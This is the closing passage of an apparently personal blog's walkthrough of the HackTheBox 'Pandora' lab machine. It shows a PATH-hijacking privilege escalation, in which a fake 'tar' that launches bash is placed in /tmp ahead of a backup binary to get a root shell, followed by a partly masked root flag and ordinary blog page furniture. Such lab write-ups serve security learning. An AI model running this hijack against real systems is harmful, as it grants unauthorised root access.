+</pre><td class="rouge-code"><pre><span class="nb">cd</span> /tmp
+<span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> <span class="nb">tar
+chmod</span> +777 <span class="nb">tar
+export </span>PATH:/tmp:<span class="nv">$PATH</span>
+pandora_backup
+</pre></table></code></div></div><p>After running, we gained root access and can get the last flag in the root directory.</p><h2 id="root">Root</h2><pre>
+root@pandora:/root# cat root.txt 
+**111*884f**818dfc628***4e5f*30d
+</pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pandora/" class="post-tag no-text-decoration" >pandora</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Pandora - ConnorsEH&url=https://connorseh.com/posts/Pandora/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Pandora - ConnorsEH&u=https://connorseh.com/posts/Pandora/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://connorseh.com/posts/Pandora/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/RouterSpace/">HackTheBox - RouterSpace</a></li><li><a href="/posts/You_Know_0xDiablos/">HackTheBox - Pwn - You Know 0xDiablos</a></li><li><a href="/posts/Devel/">HackTheBox - Devel</a></li><li><a href="/posts/Blue/">HackTheBox - Blue</a></li><li><a href="/posts/Lame/">HackTheBox - Lame</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/scriptkiddie/">scriptkiddie</a> <a class="post-tag" href="/tags/routerspace/">routerspace</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/pandora/">pandora</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/legacy/">legacy</a> <a class="post-tag" href="/tags/lame/">lame</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/devel/">devel</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Legacy/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 20, 2020 <i class="unloaded">2020-08-20T19:01:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Legacy</h3><div class="text-muted small"><p> As the oldest machine on HackTheBox, i thought Legacy would be the perfect machine to start with. It was a nice and easy first box - requiring simple enumeration following a simple SMB vulnerabili...</p></div></div></a></div><div class="card"> <a href="/posts/Lame/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 25, 2020 <i class="unloaded">2020-08-25T23:14:10+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Lame</h3><div class="text-muted small"><p> Following on from Legacy is was time to complete Lame, the first of many Linux machines. The machine required simple enumeration and another SMB exploit, resulting in a root shell. Machine IP = 10...</p></div></div></a></div><div class="card"> <a href="/posts/Blue/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 20, 2020 <i class="unloaded">2020-09-20T19:01:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blue</h3><div class="text-muted small"><p> Blue is the third hackthebox machine i have completed but is the first time without using metasploit. This machine exploits SMB using the famous SMB MS17-010 vulnerability Eternal Blue. Summary ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/You_Know_0xDiablos/" class="btn btn-outline-primary"><p>HackTheBox - Pwn - You Know 0xDiablos</p></a> <a href="/posts/RouterSpace/" class="btn btn-outline-primary"><p>HackTheBox - RouterSpace</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/C_Weeks_Pearson">ConnorDWP</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by LOTS of Coffee!</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/scriptkiddie/">scriptkiddie</a> <a class="post-tag" href="/tags/routerspace/">routerspace</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/pandora/">pandora</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/legacy/">legacy</a> <a class="post-tag" href="/tags/lame/">lame</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/devel/">devel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-178517167-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-178517167-1'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://connorseh.com{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
